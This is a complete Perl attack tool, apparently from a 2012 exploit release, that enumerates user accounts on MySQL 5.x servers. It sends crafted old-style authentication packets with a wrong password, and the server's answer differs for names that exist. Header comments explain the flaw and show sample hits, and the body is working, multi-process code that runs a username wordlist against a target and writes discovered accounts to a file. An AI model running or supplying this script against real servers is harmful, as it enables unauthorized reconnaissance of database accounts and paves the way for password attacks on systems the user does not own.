# MySQL User Account Enumeration Utility
# When an attacker authenticates using an incorrect password
# with the old authentication mechanism from mysql 4.x and below to a mysql 5.x server
# the mysql server will respond with a different message than Access Denied, what makes
# User Account Enumeration possible.
# The Downside is that the attacker has to reconnect for each user enumeration attempt
#20000 user accounts in 7 minutes
#Mon Jan 16 09:00:18 UTC 2012
#Mon Jan 16 09:07:26 UTC 2012
#root@vs2067037:~# wc -l MEDIUM.LST
#21109 MEDIUM.LST
#A usernames.txt wordlist is included in this package
#examples:
#root@vs2067037:~# perl mysqlenum.pl host usernames.txt
#
#[*] HIT! -- USER EXISTS: administrator@host
#
#root@vs2067037:~# perl mysqlenum.pl host usernames.txt
#
#[*] HIT! -- USER EXISTS: admin@host
#

use IO::Socket;
use Parallel::ForkManager;
$|=1;

if ($#ARGV != 1) {
print "Usage: mysqlenumerate.pl <target> <wordlist>\n";
exit;
}

$target = $ARGV[0];
$wordlist = $ARGV[1];
$numforks = 50;
$pm = new Parallel::ForkManager($numforks);

open FILE,"<$wordlist";
unlink '/tmp/cracked';

@users = ();
$k=0;
while(<FILE>) {
        chomp;
        $_ =~ s/\r//g;
        $users[$k++] = $_;
}
close FILE;
$k2 = 0;
for(;;) {
for ($k=0;$k<$numforks;$k++) {
$k2++;
if (($k2 > $#users) or (-e '/tmp/cracked')) {
exit;
}
my $pid = $pm->start and next;
$user = $users[$k2];
goto further;
again:
print "Connect Error\n";
further:
my $sock = IO::Socket::INET->new(PeerAddr => $target,
                              PeerPort => '3306',
                              Proto    => 'tcp') || goto again;
recv($sock, $buff, 1024, 0);

$buf = "\x00\x00\x01\x8d\x00\x00\x00\x00$user\x00\x50".
                        "\x4e\x5f\x51\x55\x45\x4d\x45\x00";
$buf = chr(length($buf)-3). $buf;
print $sock $buf;
$res = recv($sock, $buff, 1024, 0);
close($sock);
if ($k2 % 100 == 0) {
print $buff."\n";
}
if (substr($buff, 7, 6) eq "Access") {$pm->finish;next;}
unless (-e '/tmp/cracked') {
open FILE, ">/tmp/cracked";
close FILE;
print "\n[*] HIT! -- USER EXISTS: $user\@$target\n";
open FILE, ">jackpot";
print FILE "\n[*] HIT! -- USER EXISTS: $user\@$target\n";
exit;
}
}
$pm->wait_all_children;
}